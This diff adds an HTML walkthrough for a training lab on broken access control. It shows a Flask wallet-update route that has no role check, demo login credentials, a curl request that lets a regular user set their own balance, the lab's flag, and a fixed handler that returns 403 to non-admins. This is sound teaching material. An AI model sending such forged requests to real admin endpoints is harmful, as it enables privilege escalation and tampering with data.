@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lab 1 Walkthrough</title>
+  <style>
+    :root {
+      --bg: #0b0f14;
+      --panel: #11161d;
+      --text: #e5e7eb;
+      --muted: #a3acb9;
+      --line: #222a35;
+      --accent: #f59e0b;
+      --code-bg: #0f141b;
+      --code-text: #dbe4ee;
+      --kw: #c792ea;
+      --fn: #82aaff;
+      --str: #c3e88d;
+      --tag: #f78c6c;
+      --attr: #ffcb6b;
+      --var: #b0bec5;
+      --comment: #6b7280;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: Arial, Helvetica, sans-serif;
+      padding: 32px 16px 48px;
+    }
+    .page { max-width: 820px; margin: 0 auto; }
+    .article {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 10px;
+      padding: 32px;
+    }
+    .eyebrow {
+      font-size: 0.78rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin-bottom: 14px;
+    }
+    h1 { font-size: 2.2rem; line-height: 1.1; margin-bottom: 16px; font-weight: 700; }
+    .lead { font-size: 1rem; line-height: 1.7; color: var(--muted); margin-bottom: 32px; }
+    section + section { margin-top: 36px; padding-top: 28px; border-top: 1px solid var(--line); }
+    h2 { font-size: 1.35rem; margin-bottom: 14px; }
+    h3 { font-size: 0.98rem; margin: 22px 0 10px; color: var(--text); }
+    p { font-size: 0.98rem; line-height: 1.7; color: var(--muted); margin-bottom: 14px; }
+    pre {
+      margin: 14px 0 18px;
+      padding: 16px 18px;
+      overflow-x: auto;
+      background: var(--code-bg);
+      color: var(--code-text);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      font: 0.94rem/1.65 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    }
+    code.inline {
+      font: 0.92em ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      background: #1b2330;
+      color: var(--accent);
+      padding: 2px 6px;
+      border-radius: 6px;
+    }
+    .callout {
+      padding: 16px 18px;
+      border-left: 4px solid var(--accent);
+      background: #0f141b;
+      margin: 14px 0 18px;
+      color: var(--muted);
+    }
+    .kw { color: var(--kw); }
+    .fn { color: var(--fn); }
+    .str { color: var(--str); }
+    .tag { color: var(--tag); }
+    .attr { color: var(--attr); }
+    .var { color: var(--var); }
+    .comment { color: var(--comment); }
+    strong { color: var(--text); }
+    @media (max-width: 820px) {
+      body { padding: 20px 12px 40px; }
+      .article { padding: 24px 20px; }
+      h1 { font-size: 2rem; }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <article class="article">
+      <div class="eyebrow">Day 1 / Lab 1</div>
+      <h1>Broken Access Control on an Admin Endpoint</h1>
+      <p class="lead">The store gates the "Buy Flag" button to user id 2, who only starts with 10 coins. The admin profile shows a wallet-update form, but the endpoint behind it never checks who is calling it. Any logged-in user can top up any wallet.</p>
+
+      <section>
+        <h2>Quick Reminder — Broken Access Control</h2>
+        <p><strong>Broken access control</strong> happens when the server trusts the client to enforce who can do what. Hiding a button in the UI is not authorization; the route handler must check the caller's role itself.</p>
+        <p>In this lab the impact is <strong>privilege escalation through state tampering</strong>: a regular user reaches an admin function to give themselves the coins they need to buy the flag.</p>
+      </section>
+
+      <section>
+        <h2>Where the vulnerability comes from</h2>
+        <p>The wallet-update route accepts any authenticated session and writes the new balance straight in. There is no role check.</p>
+
+        <pre><span class="kw">@app</span>.route(<span class="str">"/admin/update_wallet"</span>, methods=[<span class="str">"POST"</span>])
+<span class="kw">def</span> <span class="fn">update_wallet</span>():
+    <span class="var">data</span> = request.get_json(silent=<span class="kw">True</span>) <span class="kw">or</span> {}
+    <span class="var">uid</span> = <span class="fn">int</span>(data.get(<span class="str">"id"</span>, <span class="str">0</span>) <span class="kw">or</span> request.form.get(<span class="str">"id"</span>, <span class="str">0</span>))
+    <span class="var">new_sold</span> = <span class="fn">int</span>(data.get(<span class="str">"sold"</span>, <span class="str">0</span>) <span class="kw">or</span> request.form.get(<span class="str">"sold"</span>, <span class="str">0</span>))
+    <span class="kw">if</span> uid <span class="kw">in</span> users:
+        users[uid][<span class="str">"coins"</span>] = new_sold
+        <span class="kw">return</span> ...</pre>
+
+        <div class="callout">
+          <p>The form that calls this endpoint is rendered only inside the admin profile. That is a UI affordance, not a security control. The route is reachable by anyone who knows the path.</p>
+        </div>
+      </section>
+
+      <section>
+        <h2>Exploitation</h2>
+        <p>Log in as the regular user, then send the admin form's request directly. Use the same field names the admin's form uses (<code class="inline">id</code> and <code class="inline">sold</code>).</p>
+
+        <h3>Login</h3>
+        <pre>username=user
+password=user123</pre>
+
+        <h3>Request the "admin" endpoint as the regular user</h3>
+        <pre><span class="fn">curl</span> -i http://localhost:5009/admin/update_wallet \
+  -b cookies.txt \
+  --data <span class="str">"id=2&sold=999"</span></pre>
+
+        <p>The server accepts the request, writes 999 coins to user id 2, and redirects back to the profile. Visit the store and click <strong>Buy</strong> — the flag is yours.</p>
+
+        <h3>Flag</h3>
+        <pre>CONGR4TS_H333333333CKER</pre>
+      </section>
+
+      <section>
+        <h2>The Fix</h2>
+        <p>Authorization belongs on the server. Decide what an admin is, and reject the request before doing any work.</p>
+
+        <pre><span class="kw">def</span> <span class="fn">is_admin</span>(<span class="var">u</span>):
+    <span class="kw">return</span> u <span class="kw">and</span> u[<span class="str">"id"</span>] == <span class="str">1</span>
+
+<span class="kw">@app</span>.route(<span class="str">"/admin/update_wallet"</span>, methods=[<span class="str">"POST"</span>])
+<span class="kw">def</span> <span class="fn">update_wallet</span>():
+    <span class="var">cu</span> = current_user()
+    <span class="kw">if not</span> is_admin(cu):
+        <span class="kw">return</span> <span class="str">"forbidden"</span>, <span class="str">403</span>
+    <span class="comment"># ... rest of the handler</span></pre>
+
+        <p>Two reinforcing rules to remember:</p>
+        <ul style="color: var(--muted); padding-left: 22px; line-height: 1.7;">
+          <li>Hiding a control in the UI is not access control.</li>
+          <li>Every privileged endpoint must verify the caller's identity and role itself, on every request.</li>
+        </ul>
+      </section>
+    </article>
+  </main>
+</body>
+</html>
